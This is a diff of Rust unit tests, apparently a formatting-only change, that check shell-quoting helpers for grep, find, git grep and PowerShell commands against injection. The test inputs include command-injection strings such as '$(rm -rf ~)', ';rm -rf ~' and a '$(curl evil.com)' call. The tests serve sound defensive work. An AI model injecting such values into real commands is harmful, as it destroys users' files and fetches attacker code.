@@ -180,8 +180,7 @@ mod path_shell_quoting {
     fn is_file_path_command_substitution_powershell() {
         // PowerShell expands `$(...)` inside `"..."`; with backtick-escaping
         // applied, the substitution becomes literal text.
-        let cmd =
-            build_is_file_path_command("C:\\tmp\\x$(rm -rf ~)y", ShellType::PowerShell);
+        let cmd = build_is_file_path_command("C:\\tmp\\x$(rm -rf ~)y", ShellType::PowerShell);
         assert!(
             !cmd.contains("$(rm"),
             "PowerShell `$(...)` must be neutralized; got: {cmd}",
@@ -229,8 +228,7 @@ mod path_shell_quoting {
 
     #[test]
     fn is_git_repository_command_substitution_powershell() {
-        let cmd =
-            build_is_git_repository_command("C:\\x$(rm -rf ~)y", ShellType::PowerShell);
+        let cmd = build_is_git_repository_command("C:\\x$(rm -rf ~)y", ShellType::PowerShell);
         assert!(
             !cmd.contains("$(rm"),
             "PowerShell `$(...)` must be neutralized; got: {cmd}",
@@ -274,11 +272,8 @@ mod grep_shell_quoting {
     #[test]
     fn git_grep_neutralises_query_command_substitution_posix() {
         // Without escaping, this would run `touch ~/PWNED` before `git grep`.
-        let cmd = build_git_grep_command(
-            &["$(touch ~/PWNED)".to_string()],
-            "/repo",
-            ShellType::Bash,
-        );
+        let cmd =
+            build_git_grep_command(&["$(touch ~/PWNED)".to_string()], "/repo", ShellType::Bash);
         assert!(!cmd.contains("$(touch"), "got: {cmd}");
         assert_eq!(
             cmd,
@@ -288,11 +283,7 @@ mod grep_shell_quoting {
 
     #[test]
     fn git_grep_neutralises_query_backticks_posix() {
-        let cmd = build_git_grep_command(
-            &["`id`".to_string()],
-            "/repo",
-            ShellType::Bash,
-        );
+        let cmd = build_git_grep_command(&["`id`".to_string()], "/repo", ShellType::Bash);
         assert!(!cmd.contains("`id`"), "got: {cmd}");
     }
 
@@ -332,26 +323,23 @@ mod grep_shell_quoting {
     fn grep_neutralises_query_semicolon_chain() {
         // A query like `;rm -rf ~` must not turn into a second command.
         let cmd = build_grep_command(&["x;rm -rf ~".to_string()], "/repo");
-        assert!(!cmd.contains(" ;rm") && !cmd.contains(" -rf "), "got: {cmd}");
+        assert!(
+            !cmd.contains(" ;rm") && !cmd.contains(" -rf "),
+            "got: {cmd}"
+        );
     }
 
     #[test]
     fn select_string_neutralises_query_substitution() {
         // Mirrors the POSIX case for the PowerShell Select-String path.
-        let cmd = build_select_string_command(
-            &["$(rm -rf ~)".to_string()],
-            "C:\\repo",
-        );
+        let cmd = build_select_string_command(&["$(rm -rf ~)".to_string()], "C:\\repo");
         assert!(!cmd.contains("$(rm"), "got: {cmd}");
         assert!(cmd.contains("Select-String"));
     }
 
     #[test]
     fn select_string_neutralises_target_substitution() {
-        let cmd = build_select_string_command(
-            &["foo".to_string()],
-            "C:\\tmp\\x$(curl evil.com)y",
-        );
+        let cmd = build_select_string_command(&["foo".to_string()], "C:\\tmp\\x$(curl evil.com)y");
         assert!(!cmd.contains("$(curl"), "got: {cmd}");
     }
 }
@@ -382,14 +370,8 @@ mod file_glob_shell_quoting {
         // A pattern containing `'` previously closed the surrounding `'...'`
         // pair and could append `; rm -rf ~`. After escaping, the `'` is
         // backslash-escaped and stays inside the `-name` argument.
-        let cmd = build_find_command(
-            &["foo';rm -rf ~;echo '".to_string()],
-            "/repo",
-        );
-        assert!(
-            !cmd.contains("';rm") && !cmd.contains("rf ~"),
-            "got: {cmd}",
-        );
+        let cmd = build_find_command(&["foo';rm -rf ~;echo '".to_string()], "/repo");
+        assert!(!cmd.contains("';rm") && !cmd.contains("rf ~"), "got: {cmd}",);
     }
 
     #[test]
@@ -412,10 +394,7 @@ mod file_glob_shell_quoting {
             None,
             ShellType::Bash,
         );
-        assert!(
-            !cmd.contains("';rm") && !cmd.contains("rf ~"),
-            "got: {cmd}",
-        );
+        assert!(!cmd.contains("';rm") && !cmd.contains("rf ~"), "got: {cmd}",);
     }
 
     #[test]
@@ -450,10 +429,7 @@ mod file_glob_shell_quoting {
             None,
             ShellType::PowerShell,
         );
-        assert!(
-            !cmd.contains("';rm") && !cmd.contains("rf ~"),
-            "got: {cmd}",
-        );
+        assert!(!cmd.contains("';rm") && !cmd.contains("rf ~"), "got: {cmd}",);
     }
 
     #[test]
@@ -464,27 +440,19 @@ mod file_glob_shell_quoting {
             &["foo';rm -rf ~;echo '".to_string()],
             "C:\\repo",
         );
-        assert!(
-            !cmd.contains("';rm") && !cmd.contains("rf ~"),
-            "got: {cmd}",
-        );
+        assert!(!cmd.contains("';rm") && !cmd.contains("rf ~"), "got: {cmd}",);
     }
 
     #[test]
     fn powershell_get_childitem_neutralises_pattern_substitution() {
-        let cmd = build_powershell_get_childitem_command(
-            &["$(rm -rf ~)".to_string()],
-            "C:\\repo",
-        );
+        let cmd = build_powershell_get_childitem_command(&["$(rm -rf ~)".to_string()], "C:\\repo");
         assert!(!cmd.contains("$(rm"), "got: {cmd}");
     }
 
     #[test]
     fn powershell_get_childitem_neutralises_target_substitution() {
-        let cmd = build_powershell_get_childitem_command(
-            &["*.rs".to_string()],
-            "C:\\tmp\\x$(rm -rf ~)y",
-        );
+        let cmd =
+            build_powershell_get_childitem_command(&["*.rs".to_string()], "C:\\tmp\\x$(rm -rf ~)y");
         assert!(!cmd.contains("$(rm"), "got: {cmd}");
     }
 }
